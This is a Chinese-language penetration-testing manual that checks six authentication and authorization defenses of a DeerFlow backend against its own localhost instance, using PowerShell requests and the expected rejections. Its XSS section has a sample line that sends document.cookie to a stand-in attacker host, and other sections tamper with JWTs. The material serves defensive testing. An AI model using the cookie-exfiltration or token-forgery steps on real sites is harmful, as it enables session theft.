# DeerFlow 六层防御渗透测试手册

> 基于 `deer-flow-0502` 的分层防御架构，设计的手动渗透测试指南。
> 每一层都用一个**真实可执行的手动攻击案例**来验证防御效果。

---

## 📋 前置准备

先确保后端跑起来（默认端口 `8001`）：

```powershell
# 测试环境假设
$BASE = "http://localhost:8001"
```

需要创建两个测试账号：

```powershell
# 注册用户A（普通用户）
Invoke-RestMethod -Uri "$BASE/api/v1/auth/register" -Method POST -ContentType "application/json" -Body '{"email":"alice@test.com","password":"Alice123!"}' -SessionVariable aliceSession

# 注册用户B（另一个普通用户）
Invoke-RestMethod -Uri "$BASE/api/v1/auth/register" -Method POST -ContentType "application/json" -Body '{"email":"bob@test.com","password":"Bob123!"}' -SessionVariable bobSession

# 创建管理员账号（如果系统还没初始化）
Invoke-RestMethod -Uri "$BASE/api/v1/auth/initialize" -Method POST -ContentType "application/json" -Body '{"email":"admin@test.com","password":"Admin123!"}'
```

> 💡 下面所有测试都会用到 `$aliceSession` 和 `$bobSession`，这是 PowerShell 的"会话变量"，会自动帮你管理 Cookie。

---

## 🔴 第1层攻击：Fail-Closed — 不带卡硬闯会所

### 防御目标
**AuthMiddleware** 的默认拒绝策略——任何不确定身份的请求一律挡在门外。

### 攻击思路
假装没带门禁卡，直接往会所里走，看能不能混进去。

### 攻击步骤

```powershell
# 攻击1.1：不带Cookie访问对话列表
try {
    Invoke-RestMethod -Uri "$BASE/api/threads" -Method GET
} catch {
    $_.Exception.Response.StatusCode.value__
}
# 预期结果：401

# 攻击1.2：不带Cookie访问"获取当前用户"
try {
    Invoke-RestMethod -Uri "$BASE/api/v1/auth/me" -Method GET
} catch {
    $_.Exception.Response.StatusCode.value__
}
# 预期结果：401

# 攻击1.3：但健康检查接口应该能访问（公开路径）
Invoke-RestMethod -Uri "$BASE/health" -Method GET
# 预期结果：200
```

### 为什么会失败？

```python
# auth_middleware.py 第84-93行
if not request.cookies.get("access_token"):
    return JSONResponse(status_code=401, detail="Authentication required")
```

**这就是 Fail-Closed**：没卡？直接拒绝。不是"看看你要去哪个房间再决定"，而是"大门都不让进"。

### 🛡️ 防御总结
| 攻击方式 | 结果 | 防御机制 |
|---------|------|---------|
| 裸访API | ❌ 401 | 非公开路径必须有Cookie |
| 访问/health | ✅ 200 | 公开路径白名单放行 |

---

## 🔴 第2层攻击：XSS 脚本偷卡

### 防御目标
**HttpOnly Cookie** —— 即使网页上有恶意脚本，也读不到你的门禁卡。

### 攻击思路
假设你登录了一个"坏网页"，网页里的 JavaScript 想偷走你的 Cookie 发给黑客服务器。

### 攻击步骤

**Step 1**：先用 Alice 登录

```powershell
Invoke-RestMethod -Uri "$BASE/api/v1/auth/login/local" -Method POST -ContentType "application/json" -Body '{"email":"alice@test.com","password":"Alice123!"}' -SessionVariable aliceSession
```

**Step 2**：打开浏览器，访问 `http://localhost:8001/docs`（Swagger 文档页面），按 `F12` 打开开发者工具，切换到 **Console（控制台）**。

**Step 3**：在控制台执行下面两行"恶意脚本"：

```javascript
// 攻击脚本：尝试读取所有 Cookie
console.log("我能读到的 Cookie：", document.cookie);

// 攻击脚本：尝试把 Cookie 发给黑客服务器（模拟）
fetch("https://evil-hacker.com/steal?cookie=" + document.cookie);
```

### 预期结果

```javascript
// 控制台输出类似：
"我能读到的 Cookie： ""   ← 空的！或者只有不包含 access_token 的其他 cookie
```

**`access_token` 完全不会出现！**

### 为什么会失败？

```python
# auth.py 登录时设置 Cookie
response.set_cookie(
    key="access_token",
    value=token,
    httponly=True,   # ← 关键！浏览器禁止 JavaScript 读取
)
```

**HttpOnly 的作用**：浏览器收到 `Set-Cookie: access_token=xxx; HttpOnly` 后，会把这张卡锁在"保险柜"里。JavaScript 的 `document.cookie` 只能看到**没有** `HttpOnly` 标志的 Cookie。

### 🛡️ 防御总结
| 攻击方式 | 结果 | 防御机制 |
|---------|------|---------|
| `document.cookie` 读取 | ❌ 读不到 | HttpOnly 标志 |
| XSS 脚本偷卡发送给外网 | ❌ 偷不到 | Cookie 被浏览器隔离 |

> ⚠️ **注意**：如果你用 `curl` 或 PowerShell 手动带 Cookie，那是**你自己主动出示**的卡，不算"被偷"。HttpOnly 防的是**网页脚本在你不知情时偷卡**。

---

## 🔴 第3层攻击：伪造/篡改/过期门禁卡

### 防御目标
**JWT 签名校验** —— 服务器用密钥验证封条，假卡、改过内容的卡、过期的卡一律拒收。

### 攻击思路
做一张假卡、偷一张过期的真卡、或者篡改真卡上的信息。

### 攻击步骤

**Step 1**：先登录获取真卡

```powershell
$login = Invoke-RestMethod -Uri "$BASE/api/v1/auth/login/local" -Method POST -ContentType "application/json" -Body '{"email":"alice@test.com","password":"Alice123!"}' -SessionVariable aliceSession
# 登录成功，Cookie 已经存在 $aliceSession 中
```

**Step 2**：攻击3.1 —— 用**完全随机的字符串**冒充 Token

```powershell
# 手动构造一个假请求，带上乱填的 Cookie
$fakeHeaders = @{ Cookie = "access_token=我是一张假卡12345" }
try {
    Invoke-RestMethod -Uri "$BASE/api/v1/auth/me" -Method GET -Headers $fakeHeaders
} catch {
    ($_.ErrorDetails.Message | ConvertFrom-Json).detail.code
}
# 预期结果：TOKEN_INVALID 或 MALFORMED
```

**Step 3**：攻击3.2 —— 用**篡改过的真卡**

先获取你的真 Token：

```powershell
# 从 session 中提取 Cookie
$aliceSession.Cookies.GetCookies("$BASE/api/v1/auth/me") | Where-Object { $_.Name -eq "access_token" }
```

你会看到类似：
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhNzI4YjQxMi0iLCJleHAiOjE3MTYyMzkwMjJ9.SflKxwRJSMeKKF2QT4fwpMe
```

把这串复制到 [jwt.io](https://jwt.io) 网站：

- **左边（Decoded）** 能看到 Payload 内容，比如 `exp: 1716239022`（过期时间戳）
- 把 `exp` 改成 `9999999999`（一百年后过期）
- **右边（Encoded）** 会重新生成 Header 和 Payload

但注意：**Signature（第三部分）会变成红色"Invalid Signature"**！

```powershell
# 复制 jwt.io 上篡改后的完整字符串
$forgedToken = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhNzI4YjQxMi0iLCJleHAiOjk5OTk5OTk5OTl9.这个封条是假的"
$forgedHeaders = @{ Cookie = "access_token=$forgedToken" }

try {
    Invoke-RestMethod -Uri "$BASE/api/v1/auth/me" -Method GET -Headers $forgedHeaders
} catch {
    ($_.ErrorDetails.Message | ConvertFrom-Json).detail.code
}
# 预期结果：INVALID_SIGNATURE
```

**为什么会失败？**
- 你改了 Payload（过期时间）
- 但 Signature 是用**原 Payload + 密钥**算出来的
- 服务器用同样的密钥重新算封条，发现对不上 → 拒绝

**Step 4**：攻击3.3 —— 用**过期的真卡**

等7天不太现实，但你可以用代码生成一个已经过期的 Token：

```python
# 临时用 Python 生成过期Token（需要知道密钥，实际攻击中拿不到）
import jwt, datetime
expired = jwt.encode(
    {"sub": "alice-user-id", "exp": datetime.datetime(2020, 1, 1), "ver": 0},
    "AUTH_JWT_SECRET的值",
    algorithm="HS256"
)
print(expired)
```

实际上在测试中，更简单的做法是：
- 登录获取 Token
- 重启服务器（如果 `AUTH_JWT_SECRET` 没设置，会生成新密钥）
- 用旧 Token 访问

```powershell
# 重启服务器后，用之前的 Session 访问
try {
    Invoke-RestMethod -Uri "$BASE/api/v1/auth/me" -Method GET -WebSession $aliceSession
} catch {
    ($_.ErrorDetails.Message | ConvertFrom-Json).detail.code
}
# 预期结果：INVALID_SIGNATURE（因为服务器换了密钥）
```

### 🛡️ 防御总结
| 攻击方式 | 结果 | 防御机制 |
|---------|------|---------|
| 随机字符串冒充 | ❌ MALFORMED | JWT 格式校验 |
| 篡改 Payload | ❌ INVALID_SIGNATURE | HS256 封条校验 |
| 过期 Token | ❌ EXPIRED | `exp` 时间戳校验 |
| 服务器换密钥后的旧 Token | ❌ INVALID_SIGNATURE | 密钥一致性校验 |

---

## 🔴 第4层攻击：旧钥匙开门 — Token Version 吊销测试

### 防御目标
**Token Version** —— 用户改密码后，所有旧 Token 立即失效。

### 攻击思路
偷了用户的旧卡，但用户后来换了锁（改了密码），看旧卡还能不能用。

### 攻击步骤

**Step 1**：Alice 登录，记录旧卡

```powershell
Invoke-RestMethod -Uri "$BASE/api/v1/auth/login/local" -Method POST -ContentType "application/json" -Body '{"email":"alice@test.com","password":"Alice123!"}' -SessionVariable aliceSessionOld

# 验证旧卡能用
Invoke-RestMethod -Uri "$BASE/api/v1/auth/me" -Method GET -WebSession $aliceSessionOld
# 预期：返回 Alice 的用户信息 ✅
```

**Step 2**：Alice 改密码（换锁）

```powershell
Invoke-RestMethod -Uri "$BASE/api/v1/auth/change-password" -Method POST -ContentType "application/json" -Body '{"current_password":"Alice123!","new_password":"AliceNew456!"}' -WebSession $aliceSessionOld
# 改密码成功，服务器内部 token_version 从 0 → 1
```

**Step 3**：用**旧卡**访问（换锁后的旧钥匙）

```powershell
try {
    Invoke-RestMethod -Uri "$BASE/api/v1/auth/me" -Method GET -WebSession $aliceSessionOld
} catch {
    ($_.ErrorDetails.Message | ConvertFrom-Json).detail
}
# 预期结果：{"code":"TOKEN_INVALID","message":"Token revoked (password changed)"}
```

**Step 4**：用**新密码重新登录**获取新卡

```powershell
Invoke-RestMethod -Uri "$BASE/api/v1/auth/login/local" -Method POST -ContentType "application/json" -Body '{"email":"alice@test.com","password":"AliceNew456!"}' -SessionVariable aliceSessionNew

# 验证新卡能用
Invoke-RestMethod -Uri "$BASE/api/v1/auth/me" -Method GET -WebSession $aliceSessionNew
# 预期：返回 Alice 的用户信息 ✅
```

### 为什么会失败？

```python
# deps.py 第217行
if user.token_version != payload.ver:
    raise HTTPException(401, "Token revoked (password changed)")
```

数据库里的 `token_version` 已经变成 `1` 了，但旧 Token 里封存的 `ver` 还是 `0`。服务器一比对：`0 != 1` → 拒绝！

### 🛡️ 防御总结
| 攻击方式 | 结果 | 防御机制 |
|---------|------|---------|
| 用改密码前的旧 Token | ❌ TOKEN_INVALID | token_version 递增校验 |
| 用改密码后的新 Token | ✅ 正常访问 | token_version 匹配 |

---

## 🔴 第5层攻击：跨用户数据隔离 — 偷看别人的储物柜

### 防御目标
**Repository 层 AUTO Sentinel 隔离** —— 即使过了大门认证，也只能看到自己的数据。

### 攻击思路
Bob 已经成功刷卡进了会所（有合法 Token），但他试图打开 Alice 的储物柜。

### 攻击步骤

**Step 1**：Alice 登录并创建一个对话

```powershell
Invoke-RestMethod -Uri "$BASE/api/v1/auth/login/local" -Method POST -ContentType "application/json" -Body '{"email":"alice@test.com","password":"AliceNew456!"}' -SessionVariable aliceSession

# 创建对话
$thread = Invoke-RestMethod -Uri "$BASE/api/threads" -Method POST -ContentType "application/json" -Body '{"metadata":{"title":"Alice的秘密对话"}}' -WebSession $aliceSession
$aliceThreadId = $thread.thread_id
Write-Host "Alice 的对话ID：$aliceThreadId"
```

**Step 2**：Bob 登录

```powershell
Invoke-RestMethod -Uri "$BASE/api/v1/auth/login/local" -Method POST -ContentType "application/json" -Body '{"email":"bob@test.com","password":"Bob123!"}' -SessionVariable bobSession
```

**Step 3**：Bob 尝试**直接访问** Alice 的对话

```powershell
try {
    Invoke-RestMethod -Uri "$BASE/api/threads/$aliceThreadId" -Method GET -WebSession $bobSession
} catch {
    $status = $_.Exception.Response.StatusCode.value__
    $body = $_.ErrorDetails.Message
    Write-Host "状态码: $status"
    Write-Host "返回体: $body"
}
# 预期结果：404 Not Found
```

**注意：是 404，不是 403！**

**Step 4**：Bob 尝试**搜索**所有对话

```powershell
$threads = Invoke-RestMethod -Uri "$BASE/api/threads/search" -Method POST -ContentType "application/json" -Body '{}' -WebSession $bobSession
Write-Host "Bob 能看到的对话数：" $threads.Count
# 预期结果：0 或只有 Bob 自己的对话
```

**Step 5**：Bob 尝试**删除** Alice 的对话

```powershell
try {
    Invoke-RestMethod -Uri "$BASE/api/threads/$aliceThreadId" -Method DELETE -WebSession $bobSession
} catch {
    $_.Exception.Response.StatusCode.value__
}
# 预期结果：404
```

**Step 6**（额外测试）：Bob 尝试访问 Alice 的 memory

```powershell
try {
    Invoke-RestMethod -Uri "$BASE/api/memory" -Method GET -WebSession $bobSession
} catch {
    $_.Exception.Response.StatusCode.value__
}
# Bob 能访问，但看到的是 Bob 自己的 memory（空或 Bob 的数据）
```

### 为什么会失败？

```python
# thread_meta/sql.py
async def get(self, thread_id, *, user_id=AUTO):
    resolved = resolve_user_id(user_id)  # Bob的user_id
    query = select(ThreadMetaRow).where(
        ThreadMetaRow.thread_id == thread_id,
        ThreadMetaRow.user_id == resolved   # ← WHERE user_id = 'Bob的ID'
    )
```

数据库查询时自动加上了 `user_id = 'Bob的ID'`，Alice 的对话 `user_id = 'Alice的ID'`，所以根本匹配不到。返回 `None` → 上层包装成 **404**。

**为什么是 404 而不是 403？**

```python
# authz.py 第292行
raise HTTPException(status_code=404, detail=f"Thread {thread_id} not found")
```

这是**安全设计的精髓**：返回 403 等于告诉黑客"这个对话存在，只是你不配看"；返回 404 则是"我不知道你在说什么"。防止**信息泄露**。

### 🛡️ 防御总结
| 攻击方式 | 结果 | 防御机制 |
|---------|------|---------|
| 直接访问别人的 thread_id | ❌ 404 | Repository WHERE user_id 过滤 |
| 搜索别人的对话 | ❌ 搜不到 | search() 自动注入 user_id 条件 |
| 删除别人的对话 | ❌ 404 | check_access() 所有权校验 |
| 读别人的 memory | ❌ 只能读自己的 | get_effective_user_id() 隔离 |

---

## 🔴 第6层攻击：权限提升 — 普通会员闯管理员办公室

### 防御目标
**RBAC + Admin 路由保护** —— 普通用户不能访问管理员接口。

### 攻击思路
Bob 是普通会员，他尝试进入只有管理员能进的"管理员办公室"（`/api/admin/users`）。

### 攻击步骤

**Step 1**：确认 Bob 是普通用户

```powershell
Invoke-RestMethod -Uri "$BASE/api/v1/auth/me" -Method GET -WebSession $bobSession
# 预期：system_role = "user"
```

**Step 2**：Bob 尝试访问管理员接口

```powershell
try {
    Invoke-RestMethod -Uri "$BASE/api/admin/users" -Method GET -WebSession $bobSession
} catch {
    $status = $_.Exception.Response.StatusCode.value__
    $body = $_.ErrorDetails.Message
    Write-Host "状态码: $status"
    Write-Host "返回体: $body"
}
# 预期结果：403 "您没有管理员权限"
```

**Step 3**：管理员登录并访问

```powershell
Invoke-RestMethod -Uri "$BASE/api/v1/auth/login/local" -Method POST -ContentType "application/json" -Body '{"email":"admin@test.com","password":"Admin123!"}' -SessionVariable adminSession

# 管理员访问
$users = Invoke-RestMethod -Uri "$BASE/api/admin/users" -Method GET -WebSession $adminSession
Write-Host "管理员看到的用户数：" $users.Count
# 预期结果：返回所有用户列表 ✅
```

### 为什么会失败？

```python
# admin.py 第13-22行
async def require_admin(request, user=Depends(get_current_user_from_request)):
    if user.system_role != "admin":      # Bob 的 system_role 是 "user"
        raise HTTPException(403, "您没有管理员权限")
```

### 🛡️ 防御总结
| 攻击方式 | 结果 | 防御机制 |
|---------|------|---------|
| 普通用户访问 /api/admin/users | ❌ 403 | require_admin 角色校验 |
| 管理员访问 /api/admin/users | ✅ 200 | system_role == "admin" |

---

## 📊 六层防御测试结果总览

| 层级 | 攻击名称 | 攻击方式 | 结果 | 核心防御代码 |
|-----|---------|---------|------|-----------|
| **第1层** | 不带卡硬闯 | 裸访受保护API | ❌ 401 | `auth_middleware.py` 第84行 |
| **第2层** | XSS偷卡 | `document.cookie` | ❌ 读不到 | `httponly=True` |
| **第3层** | 伪造/篡改/过期卡 | 假Token、改Payload | ❌ 401 | `jwt.decode()` 签名校验 |
| **第4层** | 旧钥匙开门 | 改密码后用旧Token | ❌ 401 | `token_version` 比对 |
| **第5层** | 偷看别人储物柜 | 访问别人的thread_id | ❌ 404 | `Repository WHERE user_id` |
| **第6层** | 权限提升 | 普通用户访问admin | ❌ 403 | `require_admin` 角色校验 |

---

## 🎯 测试后的核心领悟

完成这6个测试后，你应该深刻理解：

1. **安全不是"一个锁"，而是"六道门"** —— 任何一层被突破，下一层还在等着。
2. **JWT 不是防偷的，是验真伪的** —— 真正防偷的是 HttpOnly + HTTPS。
3. **404 比 403 更安全** —— 隐藏资源存在性，让黑客"盲猜"。
4. **数据隔离在数据库层** —— 不是路由层检查一下就完事，SQL 查询自带 `WHERE user_id = ?`。
5. **改密码能换锁** —— Token Version 让泄露的 Token 可以被"远程销毁"。
